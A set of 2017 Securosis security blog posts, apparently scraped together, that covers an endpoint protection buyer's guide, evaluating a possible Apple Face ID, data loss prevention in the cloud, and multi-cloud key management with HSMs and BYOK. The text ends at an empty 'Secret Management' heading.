				<p>Endpoint security has undergone a renaissance recently. Similar to network security a decade ago, the technology had not seen significant innovation for years, and adversaries improved to a point where many organizations questioned why they kept renewing existing endpoint protection suites. It was an untenable situation.</p>

<p>The market spoke, and security companies responded with a wave of new offerings and innovations which do a much better job detecting both advanced adversaries and the techniques they use to obfuscate their activities. To be clear, there is no panacea. Nothing is 100% effective in protecting endpoints. But the latest wave of products has improved dramatically over what was available two years ago.</p>

<p>But that creates a conundrum for organizations of all sizes. With so many vendors addressing the endpoint security market with seemingly similar offerings, what should a customer buy? Which features make the most sense, depending on the sophistication and adversaries an organization faces? Ultimately, how can potential customers make heads or tails of the noise coming from the security marketing machinery?</p>

<p>At Securosis the situation was frustrating. So many buzzwords were thrown around without context. New companies emerged, making claims we considered outrageous on effectiveness. Some of this nonsense reminds us of a certain database vendor&#8217;s <em>Unbreakable</em> claims. Yes, we&#8217;ve been in this business a long time. And yes, we&#8217;ve seen pretty much everything. Twice. But we&#8217;ve <em>never</em> seen a product that blocks every attack with no false positives. Even though some companies were making that claim.</p>

<p>Sadly, that was only the tip of the iceberg of our irritation. There was a public test of these endpoint solutions, which we thought drew the wrong conclusions with a suspect methodology. If those tests were to be believed, some products kicked butt while others totally sucked. But we&#8217;ve talked with a bunch of folks who got results were consistent with the public tests, and others whose results were diametrically opposed. And not every company with decent technology was included in the tests. So if a customer were making a choice entirely based on that public test they could be led astray &#8211; ultimately, how a product performs in your environment can only really be determined by testing <strong>in your environment</strong>.</p>

<p>In Securosis-land frustration and irritation trigger action. So we got irritated and decided to clarify a very murky situation. If we could help organizations figure out what capabilities were important to them based on the problems they were trying to solve, they would be much better educated consumers when sitting with endpoint security vendors. If we could map out a process to test the efficacy of each product and compare &#8220;apples to apples&#8221;, they would make much better purchase decisions based on requirements &#8211; not how many billboards a well-funded vendor bought.</p>

<p>To be clear, billboards and marketing activity are not <em>bad</em>. You can&#8217;t grow a sustainable company without significant marketing and brand-building. But marketing is no reason to buy an endpoint security product. We found little correlation between marketing spend and product capability.</p>

<p>So at Securosis we decided to write an Endpoint Advanced Protection Buyer&#8217;s Guide. This comprehensive project will provide organizations what they need to select and evaluate endpoint security products. It will roll out over the next month, delivered in two main parts:</p>

<ol>
<li><p><strong>Selection Criteria:</strong> This part of the Buyer&#8217;s Guide will focus on the capabilities you need to address the problems you face. We&#8217;ll explain terms like file-less malware and exploit pathways, so when vendors use them you will know what they&#8217;re talking about. We will also prepare a matrix to help you assess their capabilities against your requirements, based on attacks you expect to face.</p></li>
<li><p><strong>POC Guide:</strong> Figuring out what product <em>seems</em> to fit is only half the battle. You need to make sure it works in your environment. That means a Proof of Concept (POC) to prove value and that the product does what they say. That old &#8220;Trust, but verify&#8221; thing. So we&#8217;ll map out a process to test the capabilities of endpoint security products.</p></li>
</ol>

<h2>Prevention vs. Detection/Response</h2>

<p>We have seen a pseudo-religious battle being fought, between a focus on trying to block attacks, versus focusing on detection and response once an attack is successful. We aren&#8217;t religious, and believe the best answer is a combination. As mentioned above, we don&#8217;t buy into the hype that any product can stop every attack. But we don&#8217;t believe prevention is totally useless either. So you&#8217;ll be looking at both prevention technologies and detection/response, but perhaps not at the same time.</p>

<p>We&#8217;ll prepare versions of the Buyer&#8217;s Guide for both prevention and detection/response. And yes, we&#8217;ll also integrate them for those who want to evaluate a comprehensive <em>Endpoint Advanced Protection Suite</em>.</p>

<h2>Licensing Education</h2>

<p>Those of you familiar with our Securosis business model know we post research on our blog, and then license content to educate the industry. You also probably know that we research using our <a href=""https://securosis.com/about/totally-transparent-research"">Totally Transparent Research</a> methodology. We don&#8217;t talk about specific vendors, nor do we mention or evaluate specific products. But why would an endpoint company license a totally vendor-neutral buyer&#8217;s guide which educates customers to see through their marketing shenanigans?</p>

<p><em>Because they believe in their products</em>. And they want an opportunity to show that their products actually provide a better mousetrap, and can solve the issues facing organizations around protecting endpoints.</p>

<p>So hats off to our licensees for this project. They are equipping their prospects to ask tough questions and to evaluate their technology objectively. We want to thank (in alphabetical order) <a href=""https://www.carbonblack.com/"">Carbon Black</a>, <a href=""https://www.cybereason.com/"">Cybereason</a>, <a href=""https://www.cylance.com/en_us/home.html"">Cylance</a>, <a href=""https://www.endgame.com/"">ENDGAME</a>, <a href=""https://www.fireeye.com/"">FireEye</a>, <a href=""https://sentinelone.com/"">SentinelONE</a> and <a href=""https://www.symantec.com/"">Symantec</a> for supporting this effort. We expect there may be a handful of others later in the year, and we&#8217;ll recognize them if and when they come onboard.</p>

<p>We will post pieces of the Buyer&#8217;s Guide to the blog over the next month. As always we value the feedback of our readers, so it you see something wacky, please let us know.</p>

2017-08-04 01:23:00+08:00,How to Evaluate a Possible Apple Face ID,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>It&#8217;s usually more than a little risky to comment on hypothetical Apple products, but while I was out at Black Hat and DEF CON <a href=""https://www.macrumors.com/2017/07/29/homepod-firmware-details-apple-smart-speaker/"">Apple accidentally released the firmware for their upcoming HomePod</a>. Filled with references to other upcoming products and technologies, the firmware release makes it reasonably probable that Apple will release an updated iPhone without a Touch ID sensor, relying instead on facial recognition.</p>

<p>A reasonable probability is far from an absolute certainty, but this is an interesting enough change that I think it&#8217;s worth taking a few minutes to outline how I intend to evaluate any &#8220;Face ID&#8221;, should it actually appear.</p>

<p>They key is to look for <em>equivalence,</em> rather than <em>exactness</em>. I don&#8217;t care whether Face ID (we&#8217;ll roll with that name for now) works exactly like Touch ID &#8211; we just need it close enough, or even better.</p>

<p><strong>Is it as secure?</strong></p>

<p>There are three aspects to evaluate:</p>

<ul>
<li><em>Does it cost as much to circumvent?</em> Touch ID isn&#8217;t perfect &#8211; there are a variety of ways to create fake fingerprints which can spoof it. The financial cost is not prohibitive for a serious attacker, but the attacks are all time-consuming enough that the vast <strong>vast</strong> majority of iPhone users don&#8217;t need to worry about them. I am sure someone will come up with ways around Face ID, but if they need to take multiple photos from multiple angles, compute a 3D model, 3D print the model, then accurately surface it with additional facial feature details, I&#8217;ll call that a win for Apple. It will make an awesome DEF CON or CCC presentation though.</li>
<li><em>Does it have an equivalent false positive rate?</em> From what I see, Touch ID has a false positive rate low enough to be effectively 0 in real-world use. As long as Face ID is about the same, we&#8217;ll be good to go.</li>
<li><em>Does it use a similarly secure hardware/software architecture?</em> One of the most important aspects of Touch ID is how it ties into the Secure Enclave (and, by extension, the Secure Element). These are the links that embed anti-circumvention techniques in the hardware and iOS, enabling incredibly strong security; supporting use in payment systems, banking applications, etc. I would be shocked if Apple didn&#8217;t keep this model, but expect changes to support the different kind of processing and increased multi-purpose nature of the underlying hardware (general-purpose cameras, perhaps).</li>
</ul>

<p><strong>Is it as easy to use?</strong></p>

<p>The genius of Touch ID was that it enabled consumers to use strong password, with the same convenience as no password at all (most of the time). Face ID will need to hit the same marks to be seen as successful.</p>

<ul>
<li><em>Is it as fast?</em> The first version of Touch ID was pretty darn fast, taking a second or less. The second (current) version is so fast that most of the time you barely notice it. Face ID doesn&#8217;t need to be exactly as fast, but <em>close enough that the average user won&#8217;t notice a difference</em>. If I need to hold my iPhone steady in front of my face while a little capture box pops up with a progress bar saying &#8220;Authenticating face&#8230;&#8221;, it will be a failure. But we all know that isn&#8217;t going to happen.</li>
<li><em>Does it work in as many different situations (at night, walking, etc.)?</em> Touch ID is far from perfect. I work out a ton and, awesome athlete that I am, I sweat like <a href=""https://en.wikipedia.org/wiki/Dr._Horrible%27s_Sing-Along_Blog#Cast"">Moist from Dr. Horrible&#8217;s Sing-Along Blog</a>. Touch ID isn&#8217;t a fan. Face ID doesn&#8217;t need to work in <em>exactly the same situations,</em> but in <em>an equivalent number of real-world situations</em>. For example I use Touch ID to unlock my phone sitting on a table to pass off to one of the kids, or while lying sideways in bed with my face mushed into a pillow. Face ID will probably require me to pick the phone up and look at it. In exchange, I&#8217;ll probably be able to use it with wet hands in the kitchen. Tradeoffs are fine &#8211; so long as they are net neutral, positive, or insignificant.</li>
<li><em>Does it offer an equivalent set of features?</em> My wife and I actually trust each other and share access to all our devices. With Touch ID we enroll each other&#8217;s fingerprints. Touch ID also (supposedly) improves over time. Ideally Face ID will work similarly.</li>
</ul>

<p><strong>Is it as reliable?</strong></p>

<p>The key phrase here is <em>false negative rate</em>. Even second-generation Touch ID can be fiddly at times, as in my workout example above. With Face ID we&#8217;ll look more at things like changing facial hair, lighting conditions, moving/walking, etc. These tie into ease of use, but in those cases it&#8217;s more about <em>number of situations where it works</em>. This question comes down to <em>Is Face ID as reliable within its supported scenarios?</em> This is one area where I could see some big improvements over Touch ID.</p>

<p><strong>Conclusion</strong></p>

<p>Plenty of articles will focus on all the differences if Face ID becomes a reality. Plenty of people will complain it doesn&#8217;t work exactly the same. Plenty of security researchers will find ways to circumvent it. But what really matters is whether it hits the same goal:</p>

<p><em>Allow a user to use a strong password with the convenience of no password at all&#8230; most of the time.</em></p>

<p>Face ID doesn&#8217;t need to be the same as Touch ID &#8211; it just needs to work reasonably equivalently in real-world use. I won&#8217;t bet on Face ID being real, but I <em>will</em> bet that if Apple ships it, they will make sure it&#8217;s just as good as Touch ID.</p>

2017-05-31 05:07:00+08:00,DLP in the Cloud,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>It&#8217;s been quite a while since we updated our Data Loss Prevention (DLP) research. It&#8217;s not that DLP hasn&#8217;t continued to be an area of focus (it has), but a bunch of other shiny things have been demanding our attention lately. Yeah, like the cloud. Well, it turns out a lot of organizations are using this cloud thing now, so they inevitably have questions about whether and how their existing controls (including DLP) map into the new world.</p>

<p>As we update our Understanding and Selecting DLP paper, we&#8217;d be remiss if we didn&#8217;t discuss how to handle potential leakage in cloud-based environments. But let&#8217;s not put the cart ahead of the horse. First we need to define what we mean by <em>cloud</em> with applicable use cases for DLP.</p>

<p>We could bust out the <a href=""https://cloudsecurityalliance.org/group/security-guidance/#_overview"">Cloud Security Alliance guidance</a> and hit you over the head with a bunch of cloud definitions. But for our purposes it&#8217;s sufficient to say that in terms of data access you are most likely dealing with:</p>

<ul>
<li><strong>SaaS</strong> <a href=""https://securosis.com/blog/tidal-forces-software-as-a-service-is-the-new-back-office"">Software as a Service (SaaS) is the new back office</a>. That means whether you know about it or not, you have critical data in a SaaS environment, and it must be protected.</li>
<li><strong>Cloud File Storage:</strong> These services enable you to extend a device&#8217;s file system to the cloud, replicating and syncing between devices and facilitating data sharing. Yes, these services are a specific subtype of SaaS (and PaaS, Platform as a Service), but the amount of critical data they hold, along with how differently they work than a typical SaaS application, demands that we treat them differently.</li>
<li><strong>IaaS:</strong> Infrastructure as a Service (IaaS) is the new data center. That means many of your critical applications (and data) will be moving to a cloud service provider &#8211; most likely Amazon Web Services, Microsoft Azure, or Google Cloud Platform. And inspection of data traversing a cloud-based application is, well&#8230; different, which that means protecting that data is also&#8230; different.</li>
</ul>

<p>DLP is predicated on scanning data at rest and inspecting and enforcing policies on data in motion, which is a poor fit for IaaS. You don&#8217;t really have <em>endpoints</em> suitable for DLP agent installation. Data is in either structured (like a database) or unstructured (filesystem) datastores. Data protection for structured datastores defaults to application-centric methods, will unstructured cloud file systems are really just cloud file storage (which we will address later). So inserting DLP agents into an application stack isn&#8217;t the most efficient or effective way to protect an application.</p>

<p>Compounding the problem, traditional network DLP don&#8217;t fit IaaS well either. You have limited visibility into the cloud network; to inspect traffic, you would need to route it through an inspection point, which is likely to be expensive and/or lose key cloud advantages &#8211; particularly elasticity and anywhere access. Further, cloud network traffic is encrypted more often, so even with access to full traffic, inspection at scale presents serious implementation challenges.</p>

<p>So we will focus our cloud DLP discussion on SaaS and cloud file storage.</p>

<h2>Cloud Versus Traditional Data Protection</h2>

<p>The cloud is clearly different, but what exactly does that mean? If we boil it down to its fundamental core, you still need to perform the same underlying functions &#8211; whether the data resides in a 20-year-old mainframe or the ether of a multi-cloud SaaS environment. To protect data you need to know where it is (<em>discover</em>), understand how it&#8217;s being used (<em>monitor</em>), and then enforce policies to govern what is allowed and by whom &#8211; along with any additional necessary security controls (<em>protect</em>).</p>

<p>When looking at cloud DLP many users equate protection with <em>encryption</em> but that&#8217;s a massive topic with a lot of complexity, especially in SaaS. A good start is our recent research on <a href=""https://securosis.com/blog/multi-cloud-key-management-research-paper"">Multi-Cloud Key Management</a>. There is considerable detail in that paper, but managing keys across cloud and on-premise environments is significantly more complicated; you&#8217;ll need to rely more heavily on your provider, and architect data protection and encryption directly into your cloud technology stack.</p>

<p>Thinking about discovery, do you remember the olden days &#8211; back as far as 7 years ago &#8211; when your critical data was either in your data centers or on devices you controlled? To be fair, even then it wasn&#8217;t easy to find all your critical data, but at least you knew where to look. You could search all your file servers and databases for critical data, profile and/or fingerprint it, and then look for it across your devices and your network&#8217;s egress points.</p>

<p>But as critical data started moving to SaaS applications and cloud file storage (sometimes embedded within SaaS apps), controlling data loss became more challenging because data need not always traverse a monitored egress point. So we saw the emergence of Cloud Access Security Brokers (CASB), to figure out which cloud services were in use, so you could understand (kind of) where your critical data might be. At least you had a place to look, right?</p>

<p>Enforcement of data usage policies is also a bit different in the cloud &#8211; you don&#8217;t completely control SaaS apps, nor do you have an inspection/enforcement point on the network where you can look for sensitive data and block it from leaving. We keep hearing about lack of visibility in the cloud, and this is another case where it breaks the way we used to do security.</p>

<p>So what&#8217;s the answer? It&#8217;s found in 3 letters you should be familiar with. A. P. I.</p>

<h2>API Are Your Friends</h2>

<p>Fortunately many SaaS apps and cloud file storage services provide APIs which allow you to interact with their environments, providing visibility and some degree of enforcement for your data protection policies. Many DLP offerings have integrated with the leading SaaS and cloud file storage vendors to offer you the ability to:</p>

<ol>
<li>Know when files are uploaded to the cloud and analyze them.</li>
<li>Know who is doing what with the files.</li>
<li>Encrypt or otherwise protect the files.</li>
</ol>

<p>With this access you don&#8217;t need to see the data pass by, so long as the API reliably tells you new data has moved into the environment, with sufficient flexibility to monitor and manage it. The key to DLP in the cloud is integration with API for the services you use.</p>

<p>But what happens when you don&#8217;t (or can&#8217;t) get adequate integration with cloud environments via their API? You need to see the data somehow, so that&#8217;s where a Cloud Access Security Broker comes into play.</p>

<h2>Coexistence with CASB</h2>

<p>CASB offer many functions, including providing visibility into cloud service usage within your environment. A CASB can also inspect traffic directed to cloud services by running it through a proxy. Of course this normally adds inefficiency by routing traffic unnaturally through the proxy, but the impact is highly dependent on the latency and response time requirements of the application and the network architecture. Many CASB tools can also connect to cloud providers directly via their API to evaluate activity <em>without</em> a proxy. This depends more on the cloud provider offering an API with the needed capabilities than on the CASB product itself, which is why proxy mode is often needed.</p>

<p>Because CASB inspect traffic, vendors claim to provide DLP-like functions for traffic they see heading for cloud environments. Of course DLP on your CASB cannot provide visibility or enforcement for on-premise data. So your decision depends on whether you want or need consistent policy across both on-premise and cloud environments, or separate solutions to monitor are content are sufficient.</p>

<p>There is no right or wrong answer for this decision &#8211; it depends heavily on whether the policies you implement on internal networks map well enough to data moving to SaaS and cloud file storage.</p>

<h2>Workflow Consistency</h2>

<p>Once an alert triggers, where the data resides doesn&#8217;t impact the processes your internal folks use to verify the potential leak and then assess the damage. So any workflow you have in place to handle data leakage should extend to wherever the data resides. Of course the tools for these processes differ, and your access to potentially compromised systems is radically different. For SaaS you simply have no access, as a rule. Either way, once you have a verified leak it&#8217;s time for your incident response process.</p>

<p>So preventing data leaks in SaaS and cloud file storage can be very challenging. That said, as with most cloudy things, the place to start is by revisiting your processes and technologies to see whether your existing environment is ready for the cloud.</p>

<p>But one thing we know is that there will be more cloud use tomorrow than today, so the sooner you get your arms around protecting your content &#8211; regardless of where it resides &#8211; the better for your organization.</p>

2017-05-25 06:14:00+08:00,Multi-cloud Key Management Research Paper,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>Cloud computing is the single biggest change to computing we have seen, fundamentally changing how we use computing resources. We have reached a point where multi-cloud support is a reality for most firms; SaaS and private clouds are complimented by public PaaS and IaaS. With these changes we have received an increasing number of questions on how to protect data in the cloud, so in this research paper we discuss several approaches to both keeping data secure and maintaining control over access.</p>

<p>From the paper:</p>

<blockquote>
  <p>Controlling encryption keys &#8211; and thus also your data &#8211; while adopting cloud services is one of the more difficult puzzles in moving to the cloud. For example you need to decide who creates keys (you or your provider), where they are managed (on-premises or in-cloud), how they are stored (hardware or software), how keys will be maintained, how to scale up in a dynamic environment, and how to integrate with each different cloud model you use (SaaS, PaaS, IaaS, and hybrid). And you still need to either select your own encryption library or invoke your cloud service to encrypt on your behalf. Combine this with regulatory and contractual requirements for data security that &#8211; if anything &#8211; are becoming more stringent than ever before, piecing together a solution that addresses these concerns is a challenge.</p>

2017-04-20 23:00:00+08:00,Multi-Cloud Key Management: Selection and Migration,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>Cloud services are typically described as sharing responsibility for security, but the reality is that you don&#8217;t working shoulder to shoulder with the vendor. Instead you implement security with the building blocks they provide you, possibly filling in gaps where they don&#8217;t provide solutions. One of the central goals of this research project was to show that it is possible to take control of data security, supplanting embedded encryption and key management services, even when you don&#8217;t control the environment. And with key management you can gain as much security as your on-premise solution provides &#8211; in some cases even continuing leverage familiar tools &#8211; with minimal disruption to existing management processes.</p>

<p>That said, if you decided to Bring Your Own Keys (and select a cloud HSM), or bring your own software key management stack, you are signing on for additional setup work. And it&#8217;s not always simple &#8211; the cloud variants of HSM and software key management services are different than their on-premise counterparts. This section will highlight some differences to consider when managing keys in the cloud.</p>

<h3>Governance</h3>

<p>Let&#8217;s cut to the heart of the issue: If you need an HSM, you likely have regulatory requirements or contractual obligations driving your decisions. Many of these requirements spell out specific physical and electronic security levels, typically something like FIPS 140-2 Level 2 or 140-2 Level 3. And the regulations often specify usage models, such as requiring periodic key rotation, split administrative authority, and other best practices. Cloud vendors usually publish certifications on their HSM, if not HSM specifics. You&#8217;ll likely need to dig through their documentation to understand how to manage the HSM to meet your operational requirements, and what interfaces its functions are available through &#8211; typically some or all of web application, command-line tool, and API.</p>

<p>It&#8217;s one thing to have a key rotation capability, for example, but another to prove you are using it consistently and properly. So key management service administrative actions are a favorite audit item. As your HSM is now in the cloud, you need to determine how you will access the HSM logs and move them into your SIEM or compliance reporting tools.</p>

<h3>Integration</h3>

<p>A key question is whether it is okay for your cloud provider to perform encryption and decryption on your behalf, so long as your master keys are always kept within an HSM. Essentially, if your requirement is that all encryption and signing operations must happen in hardware, you need to ensure your cloud vendor provides that option. Some SaaS solutions do not: you provide them keys derived from your master key, and the service performs the actual encryption without necessarily using an HSM. Some IaaS platforms let you choose to keep bulk encryption in their HSM platform, or leverage their software service. Find out whether your potential cloud provider offers what you need.</p>

<p>For IaaS migrations of applications and databases which encrypt data elements or columns, you may need to change the API calls to leverage the HSM or software key management service. And depending upon how your application authenticates itself to the key management server, you may also need to change to this code as well. The process to equip volume encryption services with keys varies between cloud vendors, so your operations team should investigate how startup provisioning works.</p>

<p>Finally, as we mentioned under governance, you will need to get log files from the HSM or software key manager. Logs are typically provided on demand via API calls to the cloud service, or dumped into a storage repository where you can access raw events as needed. But HSMs are a special service with additional security controls, so you will need to check with your vendor for how to access log files and what formats they offer data in.</p>

<h3>Management</h3>

<p>Whether using hardware or software, you can count on the basic services of key creation, secure storage, rotation, and encryption. But a number of concerns pop up when moving to the cloud because things work a bit differently. One is dual-administrator functions, sometimes called &#8216;split-key&#8217; authority. Two or more administrators must authorize certain sensitive administrative functions. For cloud-based key management you&#8217;ll need to designate your HSM operators. These operators will are typically issued identity certificates and hardware tokens to authenticate to the HSM or key manager. We recommend that these certificates be stored in password managers on-premise, and the hardware tokens secured on-premise as well. We suggest you do not tie the role of HSM operator to an individual, but instead use a service account, so you&#8217;re not locked out of the HSM when an admin leaves the company.</p>

<p>You&#8217;ll want to modify your existing processes to accomodate changes the cloud brings. And prior to production deployment you should practice key import and rotation to ensure there are no hiccups.</p>

<h3>Operations</h3>

<p>In NIST&#8217;s definition of cloud computing one of the essential characteristics &#8211; which separates it from hosting providers and on-premise virtualization technologies &#8211; is availability on-demand and through self-service. HSM is new enough that it is not yet always fully self-service. You may need to work through a partially manual process to get set up and vetted before you can use the service. This is normally a one-time annoyance, which should not affect ongoing agility or access.</p>

<p>It is worth reiterating that HSM services cost more than software-only native key management services. SaaS services tend to charge a set-up fee and a flat monthly rate, so costs are predictable. IaaS charges are generally based on the number of keys used, so if you expect to generate lots of keys &#8211; such as one per document &#8211; costs can skyrocket. Check to see how keys are generated, how often, and how often they are rotated, for a handle on operating costs.</p>

<p>For disaster recovery you need to fully understand your cloud provider&#8217;s failover and recovery models, and whether you need to replicate keys back to your on-premise HSM. To provide infrastructure failover you may extend services across multiple zones, but perhaps not between different geographic regions. If you need multi-region replication make sure it&#8217;s available and ask about additional costs and setup.</p>

<p>HSM services generally offer failover between regions, but if you choose <em>software</em> key management you will also need to determine how the service will deploy and sync between zones or regions. This depends on both crypto vendor capabilities such as service endpoints and database replication, and also on which services your IaaS vendor offers. In any event, you will likely face additional setup and configuration.</p>

<p>Finally, if you want to bring your own keys to the cloud, you will likely decide to leverage HSM. We say this not just because it is the only supported model for SaaS, and because this is where both cloud and HSM vendors have focused their efforts. They may not have HSM fully self-service yet, but many cloud vendors offer tight integration of their HSM service &#8211; ideally with fully fleshed-out self-service, failover, and scalability. If you want BYOK and software key management for IaaS, it&#8217;s still somewhat early on the evolutionary curve. Most of the features and functions exist, just as if you were running on-premise; but ease of management and deployment, and integration are just not there yet. It is viable but requires more effort from you.</p>

2017-04-17 05:03:00+08:00,Multi-Cloud Key Management: Service and Deployment Options,Securosis Blog,"<h3>Posted under: Research and Analysis</h3>
				<p>This post will discuss how to deploy encryption keys into a third-party cloud service. We illustrate the deployment options, along with the components of a solution. We will then walk through the process of getting a key from your on-premise Hardware Security Module (HSM) into a cloud HSM. We will discuss variations on using cloud-based HSM for all encryption operations, as well as cases where you instead delegate encryption operations to the cloud-native encryption service. We&#8217;ll close out with a discussion of software-based (non-HSM) key management systems running on IaaS cloud services.</p>

<p>There are two basic design approaches to cloud key management. The most common model is generally referred to as &#8216;BYOK&#8217; (Bring Your Own Key). As the name implies you place your own keys in a cloud HSM, and use your keys with the cloud HSM service to encrypt and decrypt content. This model requires HSM to work, but does supports all cloud service models (SaaS, PaaS, and IaaS) so long as the cloud vendor offers an HSM service. The second model is software-based key management. In this case you run the same key management software you currently use on-premise, but in a multi-tenant IaaS cloud. Your vendors supplies either a server or a container image containing the software, and you configure and deploy it in your cloud environment.</p>

<p>Let&#8217;s jump into the specifics of each model, with some different ways each approach is used.</p>

<h2>BYOK</h2>

<p>Cloud platforms for commercial services offer encryption as an option for data storage and communications. With most cloud environments &#8211; especially SaaS &#8211; encryption is built-in and occurs by default for all tenants as part of the service. To keep things simple the encryption and key management interfaces are not exposed &#8211; instead encryption is a transparent function handled on the customer&#8217;s behalf. For select cloud services where stronger security is required, or regulations demand their use, Hardware Security Modules are provided as an option. These modules are physically and digitally hardened against attack to ensure that keys are secure from tampering and difficult to misuse.</p>

<p>To incorporate HSM into a cloud service, cloud vendors typically offer an extension to their key management service. In some cases it&#8217;s a simple set of additional API, but in most cases a dashboard is provided with API for provisioning and key management. In some cases, particularly when you use the same type of HSM on-premise as your cloud vendor, the full suite of HSM functions may be available. So the amount of work you need to set up BYOK varies.</p>

<p>Let&#8217;s take a closer look at getting your keys into the cloud.</p>

<h3>Exporting Keys</h3>

<p>Those of you used to using HSM on-premise understand that typically keys remain fully protected within the HSM, <em>never</em> extracted from its protection. When vendors configure HSM they are seeded with information about the vendor and the customer. This process can be reversed, providing the ability to extract keys, but generally not to use outside the HSM &#8211; traditionally only to seed another appliance.</p>

<p><img alt=""Export"" height=""334"" src=""https://securosis.com/assets/library/main/Export_S.png"" width=""288"" /></p>

<p>Key extraction is a manual process for most &#8211; if not all &#8211; HSM. It typically involves two or more security administrators providing credentials and a smart card or USB stick with a secure enclave to authenticate to the HSM, then requesting a new key for extraction. For most HSM extraction is similar: Once validation occurs, the HSM takes the customer&#8217;s master key and bundles it with information specific to the HSM vendor and the customer, and in some cases information specific to usage rights for the key, then encrypts the data. These added data elements provide additional protections for the key, dictating where it can be un-encrypted and how it may be used.</p>

<p>Export of keys does not occur over any specific proxy, and is not performed synchronously with import on a destination HSM. Instead the encrypted information bundle is sent to the cloud service provider. A cloud HSM service likely leverages at least a 2-node HSM cluster, and each vendor implements their own integration layer, so key import specifics vary widely, as does the level of effort required. In general; once the customer has been provisioned for the cloud HSM service, they can import their master key via a dashboard, API, or command line. The customer&#8217;s master key bundle is used to create their intermediate keys as needed by their cloud key hierarchy, and those intermediate keys in turn are used to generate data encryption keys as needed. These encryption keys are copied into cloud HSM as needed.</p>

<p>Each cloud provider scales up and maintains redundancy in its own ways, and they typically do not typically publish details of how. Instead they provide service guarantees for uptime and performance. The good news is you no longer need to worry much about these specifics, because they are taken care of for you. Additionally, cloud service providers do not as a rule use Active/Standby HSM pairs, preferring a more scalable &#8216;cloud&#8217; of many hardware modules, handling importation of customer keys as needed, so resiliency is likely better than whatever you have on-premise today.</p>

<p>Keep in mind that hardware-based key management support is still considered a special case by cloud service vendors. Not all customers demand it. And it is often not fully available as a self-service feature &#8211; there may be a manual sign-up process and availability in only specific regions or zones. Unlike built-in native encryption, HSM capabilities cost extra.</p>

<p>Once you have your installed in the cloud HSM service you can use it to encrypt data. But how this works varies between different cloud service models, so we will look at a couple common cases.</p>

<h3>SaaS with HSM Encryption</h3>

<p>With many SaaS services, if you contract for a cloud-based HSM service, all encryption operations on your behalf are performed inside the HSM. The native cloud encryption service may satisfy the requests on your behalf so encryption and decryption are transparent, but key access and encryption operations are performed fully within the HSM.</p>

<p>The graphic below illustrates what some cloud document services provided for BYOK. After your key is imported into the cloud (1), the key management interface installs your master key into the HSM, as we described earlier. As users upload documents to the cloud (2) the key management service requests a new data encryption key specific to the uploaded document (3). A new key is generated (4), and the uploaded document is encrypted prior to being stored in the cloud. In some cases the newly derived encryption key is now encrypted under the customer&#8217;s master key and sent back to the customer for on-premise storage in their full key backup.</p>

<p><img alt=""BYOK"" height=""294"" src=""https://securosis.com/assets/library/main/BYOK_1_S.png"" width=""432"" /></p>

<p>Of course there are differences between providers, but the basic framework is common. Other types of SaaS offerings, where encryption and decryption within the HSM is infeasible, use a slightly different process.</p>

<h3>SaaS/PaaS HSM with Native Encryption</h3>

<p>In some cases customers bring their own keys to the cloud, but the cloud provider uses derived data encryption keys for actual encryption and decryption, outside the HSM. For example, consider SaaS applications running complex reports, or PaaS services where the customer stores terabytes of information encrypted within a database. In such environments the volume of data to encrypt and decrypt can make dedicated encryption/decryption hardware infeasible or too expensive. The application and database are part of the underlying service, so the vendor has a choice of how and where to encrypt and decrypt.</p>

<p>Cloud vendors often use transparent columnar or disk encryption, with a customer encryption key derived from their master key. This key is supplied to memory-resident encryption services, so the customer master key never leaves the HSM. The number and type of data encryption keys the cloud service creates per customer varies, but one or more keys per data repository or user role is common. These in-memory encryption engines are protected from other services, which have tightly restricted access; sensitive memory including key storage is overwritten as soon as it is no longer needed.</p>

<p>The next graphic outlines what happens when when a user makes a request to a cloud service. (1) The user is first authenticated to the cloud. (2) After authentication the cloud service requests access on the user&#8217;s behalf from the key service. (3) The key management service requests a key from the HSM on the user&#8217;s behalf. (4) Assuming credentials validate and the request is authorized, the HSM returns the requested key to the key service. What happens at this point is cloud-specific. If the cloud service uses columnar data encryption the application or database decrypts data prior to presentation it to the user. If the cloud service uses volume encryption, the key is supplied when the disk is mounted, and used to decrypt disk blocks as they are read from physical media. Either way, these operations are transparent to users.</p>

<h3>Multi-Cloud HSM</h3>

<p>With these encryption and key management capabilities it does not matter if the customer&#8217;s application architecture uses a private cloud, a public cloud, a hybrid cloud, or is distributed across multiple clouds &#8211; the framework remains the same. You can leverage various cloud services and ensure <em>you</em> control data access using your own keys to encrypt and decrypt, allowing only your authorized users access to your keys. For example you could simultaneously run analytics on GCP, SharePoint on Azure, and web applications on AWS &#8211; each using data secured by <em>your</em> keys, controlled by your on-premise HSM cluster. This is the idea behind multi-cloud key management: leverage the agility and cost-effectiveness of cloud computing while protecting data from cloud administrators, hostile nation-states, law enforcement, and any other third parties. It extends your existing on-premise security controls, and is one of the few cases where on-premise security controls are fully suitable for cloud services.</p>

<p><img alt=""Multi-Cloud HSM"" height=""433"" src=""https://securosis.com/assets/library/main/Multi_S.png"" width=""432"" /></p>

<h2>BYO Key Manager</h2>

<p>The other option for multi-cloud key management is to install your own key management server in the cloud. For customers who do not use advanced hardware for key management on-premise, but want to ensure the cloud provider does not own &#8211; or cannot be compelled to turn over &#8211; keys that encrypt their data, software-based key management is suitable. In fact if you are already comfortable with software-based key management, bringing your own software to the cloud may be your first choice. Let&#8217;s take a closer look at deployment.</p>

<h3>Software Key Management</h3>

<p>Software-based key management simply means running your own key management application in the cloud. This option is only suitable for IaaS, as you need to install and configure your own servers to perform key management, but this approach provides most of the benefits of HSM. The core functions are key generation, key storage, key rotation, and API interfaces to orchestrate encryption in the cloud.</p>

<p>One downside is that you need to provide failover and replication yourself. Nor is the software model compliant with certain regulatory requirements, which mandate FIPS-certified hardware. But benefits include reduced cost compared to HSM, along with full control of key services, rather than delegating them to the cloud provider. You can import your own master keys, but more often customers generate <em>new</em> master keys for each cloud installation. Unique keys are provided to each cloud service by the key manager through API, so volume storage or databases can encrypt and decrypt as needed.</p>

<p>This graphic shows how one might deploy server images or containers within an IaaS region. Typically you would have a primary server in one zone or region and a backup in another. Replication and synchronization details are generally specific to the software you are using, but opening up a software-defined network connection between two servers is one way to allow them to communicate. Another is to use a shared persistent store, such as a database or &#8220;file bucket&#8221;, allowing each key server instance to pull updates periodically.</p>

<p><img alt=""Software KM"" height=""161"" src=""https://securosis.com/assets/library/main/Software_S.png"" width=""432"" /></p>

<h3>Secret Management</h3>

